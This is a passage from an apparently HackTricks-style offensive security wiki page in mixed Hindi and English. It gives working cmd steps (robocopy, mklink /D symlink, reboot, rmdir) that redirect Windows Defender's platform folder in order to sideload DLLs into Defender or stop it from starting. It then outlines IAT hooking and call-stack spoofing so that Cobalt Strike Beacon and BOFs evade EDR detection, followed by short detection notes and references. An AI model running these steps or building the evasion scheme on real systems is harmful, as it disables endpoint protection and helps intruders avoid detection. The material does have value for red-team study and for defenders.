- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह lexicographic रूप से उच्चतम version string वाले subfolder (उदा., `4.18.25070.5-0`) को चुनता है, और फिर वहां से Defender service processes को शुरू करता है (service/registry paths को अनुरूप रूप से अपडेट करते हुए)। यह चयन directory entries सहित directory reparse points (symlinks) पर भरोसा करता है। एक administrator इसका लाभ उठाकर Defender को attacker-writable path पर redirect कर सकता है और DLL sideloading या service disruption हासिल कर सकता है।

Preconditions
- Local Administrator (Platform फ़ोल्डर के अंतर्गत directories/symlinks बनाने के लिए जरूरी)
- Reboot करने या Defender platform re-selection (service restart on boot) trigger करने की क्षमता
- केवल built-in tools की आवश्यकता (mklink)

Why it works
- Defender अपनी खुद की folders में writes को ब्लॉक करता है, लेकिन इसका platform selection directory entries पर भरोसा करता है और lexicographically highest version चुनता है बिना यह सत्यापित किए कि target एक protected/trusted path पर resolve होता है या नहीं।

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) अपने फ़ोल्डर की ओर इशारा करते हुए Platform के अंदर एक higher-version directory symlink बनाएँ:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) ट्रिगर का चयन (रीबूट की सलाह दी जाती है):
```cmd
shutdown /r /t 0
```
4) सत्यापित करें कि MsMpEng.exe (WinDefend) पुनर्निर्देशित पथ से चल रहा है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के तहत नया process path और उस स्थान को दर्शाती service configuration/registry दिखाई देनी चाहिए।

Post-exploitation options
- DLL sideloading/code execution: Defender अपनी एप्लिकेशन डायरेक्टरी से लोड की जाने वाली DLLs को डालें/बदलें ताकि Defender के processes में कोड निष्पादित किया जा सके। See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink हटा दें ताकि अगली बार स्टार्ट करने पर configured path resolve न हो और Defender स्टार्ट करने में विफल रहे:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> ध्यान दें: यह तकनीक स्वयं privilege escalation प्रदान नहीं करती; इसके लिए admin rights आवश्यक हैं।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से target module में शिफ्ट कर सकते हैं — इसके लिए वे Import Address Table (IAT) को hook करके चयनित APIs को attacker‑controlled, position‑independent code (PIC) के माध्यम से route करते हैं। यह उन छोटे API surface से आगे जाकर evasion को सामान्य करता है जिन्हें कई kits expose करते हैं (उदा., CreateProcessA), और समान protections को BOFs और post‑exploitation DLLs तक विस्तारित करता है।

उच्च‑स्तरीय दृष्टिकोण
- Reflective loader (prepended or companion) का उपयोग करके target module के साथ एक PIC blob stage करें। PIC self‑contained और position‑independent होना चाहिए।
- जब host DLL लोड हो रहा हो, उसके IMAGE_IMPORT_DESCRIPTOR को walk करके targeted imports के IAT entries (उदा., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) को thin PIC wrappers की ओर patch करें।
- प्रत्येक PIC wrapper real API address को tail‑call करने से पहले evasions execute करता है। Typical evasions में शामिल हैं:
- call के चारों ओर memory mask/unmask करना (उदा., beacon regions को encrypt करना, RWX→RX, page names/permissions बदलना) और फिर post‑call restore करना।
- Call‑stack spoofing: एक benign stack बनाकर target API में transition करना ताकि call‑stack analysis अपेक्षित frames पर resolve हो।
- Compatibility के लिए एक interface export करें ताकि एक Aggressor script (या समकक्ष) यह register कर सके कि Beacon, BOFs और post‑ex DLLs के लिए कौन‑से APIs hook करने हैं।

Why IAT hooking here
- यह उन किसी भी code के लिए काम करता है जो hooked import का उपयोग करता है, बिना tool code में बदलाव किए या Beacon पर specific APIs को proxy करने पर निर्भर हुए।
- Covers post‑ex DLLs: LoadLibrary* को hook करके आप module loads (उदा., System.Management.Automation.dll, clr.dll) को intercept कर सकते हैं और उनके API calls पर वही masking/stack evasion लागू कर सकते हैं।
- CreateProcessA/W को wrap करके आप call‑stack–based detections के खिलाफ process‑spawning post‑ex commands का भरोसेमंद उपयोग बहाल कर सकते हैं।

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
नोट्स
- relocations/ASLR के बाद और import के पहली बार उपयोग से पहले patch लागू करें। TitanLdr/AceLdr जैसे reflective loaders लोड किए गए मॉड्यूल के DllMain के दौरान hooking दिखाते हैं।
- wrappers को छोटा और PIC‑safe रखें; असली API को उस मूल IAT मान के माध्यम से हल करें जिसे आपने patch करने से पहले कैप्चर किया था या LdrGetProcedureAddress के जरिए।
- PIC के लिए RW → RX transitions का उपयोग करें और writable+executable पेज्स न छोड़ें।

Call‑stack spoofing stub
- Draugr‑style PIC stubs एक fake call chain बनाते हैं (return addresses benign मॉड्यूल्स में) और फिर real API में pivot करते हैं।
- यह उन detections को मात देता है जो Beacon/BOFs से sensitive APIs तक canonical stacks की उम्मीद करते हैं।
- API prologue से पहले expected frames के अंदर land करने के लिए इसे stack cutting/stack stitching techniques के साथ जोड़े।

Operational integration
- post‑ex DLLs के आगे reflective loader को prepend करें ताकि PIC और hooks तब ही जब DLL लोड हो तो स्वचालित रूप से initialise हो जाएं।
- Target APIs को register करने के लिए Aggressor script का उपयोग करें ताकि Beacon और BOFs बिना code changes के पारदर्शी रूप से उसी evasion path का लाभ उठा सकें।

Detection/DFIR considerations
- IAT integrity: ऐसे entries जो non‑image (heap/anon) addresses पर resolve होते हैं; import pointers का periodic verification।
- Stack anomalies: return addresses जो loaded images से संबंधित नहीं हैं; non‑image PIC में अचानक transitions; inconsistent RtlUserThreadStart ancestry।
- Loader telemetry: in‑process writes to IAT, early DllMain activity जो import thunks को modify करती है, load पर बनाए गए unexpected RX regions।
- Image‑load evasion: यदि hooking LoadLibrary* हो रहा है, तो automation/clr assemblies के suspicious loads की निगरानी करें जो memory masking events के साथ correlated हों।

Related building blocks and examples
- Reflective loaders जो load के दौरान IAT patching करते हैं (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) और stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
